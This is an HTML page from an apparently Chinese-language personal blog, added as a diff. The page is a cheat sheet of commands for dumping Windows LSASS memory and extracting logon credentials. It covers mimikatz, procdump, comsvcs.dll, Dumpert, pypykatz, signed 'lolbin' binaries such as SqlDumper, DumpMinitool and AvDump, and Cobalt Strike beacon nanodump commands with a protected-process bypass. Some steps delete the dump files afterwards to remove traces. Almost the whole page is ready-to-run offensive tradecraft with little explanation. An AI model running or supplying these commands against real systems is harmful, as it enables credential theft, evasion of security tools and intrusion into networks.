@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>dump lsa聚合</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1> To Learn List</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>dump lsa聚合</h2>
+  <div class="post-categories">
+    
+    
+    <a href="/categories/#lsadump">lsadump</a>
+    &nbsp;
+    
+    <a href="/categories/#Done">Done</a>
+    
+    
+  </div>
+  <br>
+  <time datetime="2022-04-10T00:00:00+08:00" class="by-line">10 Apr 2022</time>
+  <h2 id="解密lsass内存">解密lsass内存</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># mimikatz
+sekurlsa::Minidump lsassdump.dmp
+sekurlsa::logonPasswords full
+</code></pre></div></div>
+
+<h2 id="wce导出hash">wce导出hash</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 仅支持Windows XP，2003，Vista，7、2008和Windows 8
+
+wce.exe -o file.txt
+wec.exe
+</code></pre></div></div>
+
+<h2 id="procdump">Procdump</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 管理员cmd
+procdump  -accepteula -ma lsass.exe lsass_dump
+
+procdump -accepteula -ma 720 lsass.dmp
+
+</code></pre></div></div>
+
+<h2 id="comsvcsdll">comsvcs.dll</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># powershell运行
+C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass.dmp full
+
+# 清理
+Remove-Item $env:TEMP\lsass.dmp -ErrorAction Ignore
+</code></pre></div></div>
+
+<h2 id="dumpert">dumpert</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># exe
+Outflank-Dumpert.exe
+
+# dll
+rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
+
+</code></pre></div></div>
+
+<h2 id="任务管理器转存">任务管理器转存</h2>
+
+<p><img src="https://raw.githubusercontent.com/woaiqiukui/BlogPic/main/pics/image-20220409122415996.png" alt="image-20220409122415996" /></p>
+
+<h2 id="mimikatz">mimikatz</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># cmd
+mimikatz_exe "sekurlsa::minidump lsass.dump" "sekurlsa::logonpasswords full" exit
+</code></pre></div></div>
+
+<h2 id="pypykatz">pypykatz</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python3
+pip install pypykatz
+
+# Parsing minidump file of the LSASS process:
+# 从dmp里解密
+pypykatz lsa minidump &lt;minidump file&gt;
+
+# Dumping LIVE system LSA secrets:
+pypykatz live lsa
+</code></pre></div></div>
+
+<h2 id="out-minidumpps1">Out-Minidump.ps1</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module Out-Minidump.ps1
+get-process lsass | Out-Minidump
+
+Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/woaiqiukui/BlogPic/main/pics/image-20220409123740776.png" alt="image-20220409123740776" /></p>
+
+<h2 id="dump64exe">dump64.exe</h2>
+
+<p>一个lolbins：<code class="language-plaintext highlighter-rouge">C:\Program Files (x86)\Microsoft Visual Studio\Installer\Feedback\</code></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files (x86)</span><span class="se">\M</span><span class="s2">icrosoft Visual Studio</span><span class="se">\I</span><span class="s2">nstaller</span><span class="se">\F</span><span class="s2">eedback</span><span class="se">\d</span><span class="s2">ump64.exe"</span> &lt;pid&gt; c:<span class="se">\u</span>sers<span class="se">\z</span>team<span class="se">\D</span>esktop<span class="se">\o</span>ut.dmp
+</code></pre></div></div>
+
+<h2 id="sqldumperexe">SqlDumper.exe</h2>
+
+<p>lolbins：<code class="language-plaintext highlighter-rouge">C:\Program Files\Microsoft SQL Server\100\Shared\SqlDumper.exe</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Full dump file
+"C:\Program Files\Microsoft SQL Server\100\Shared\SqlDumper.exe" &lt;pid&gt; 0 0x01100
+
+# Mini-dump file
+"C:\Program Files\Microsoft SQL Server\100\Shared\SqlDumper.exe" &lt;pid&gt; 0 0x0120
+
+# Mini-dump file that includes indirectly referenced memory.
+"C:\Program Files\Microsoft SQL Server\100\Shared\SqlDumper.exe" &lt;pid&gt; 0 0x0128
+
+# Filtered dump file
+"C:\Program Files\Microsoft SQL Server\100\Shared\SqlDumper.exe" &lt;pid&gt; 0 0x8100
+</code></pre></div></div>
+
+<h2 id="nanodump">nanodump</h2>
+
+<p>https://github.com/helpsystems/nanodump</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># fork
+beacon&gt; nanodump --fork --write C:\lsass.dmp
+
+# MalSecLogon
+beacon&gt; nanodump --malseclogon --dup --fork --binary C:\Windows\notepad.exe --valid
+
+
+# ppl bypass
+beacon&gt; nanodump_ppl -v -w C:\Windows\Temp\lsass.dmp
+</code></pre></div></div>
+
+<h2 id="handlekatz">HandleKatz</h2>
+
+<p>https://github.com/codewhitesec/HandleKatz</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>loader.exe --pid:744 --outfile:dump.obfuscated
+</code></pre></div></div>
+
+<p>loader需要自己改改</p>
+
+<h2 id="dumpminitool">DumpMinitool</h2>
+
+<p>又一个lolbins：<code class="language-plaintext highlighter-rouge">C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\Extensions\TestPlatform\Extensions\DumpMinitool.exe</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DumpMinitool.exe --file c:\users\public\111.txt --processId 744 --dumpType Full
+
+# 解密
+python3 Decoder.py -input dump.obfuscated -output 111.txt
+
+# 可以用pypykatz读取
+pypykatz lsa minidump 111.txt
+</code></pre></div></div>
+
+<h2 id="avdump">AvDump</h2>
+
+<p>AvDump.exe是Avast杀毒软件中自带的一个程序，可用于转储指定进程（lsass.exe）内存数据，它带有Avast杀软数字签名。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AvDump.exe --pid 980 --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file lsass.dmp
+</code></pre></div></div>
+
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   
+
+
+  
+</body>
+
+</html>
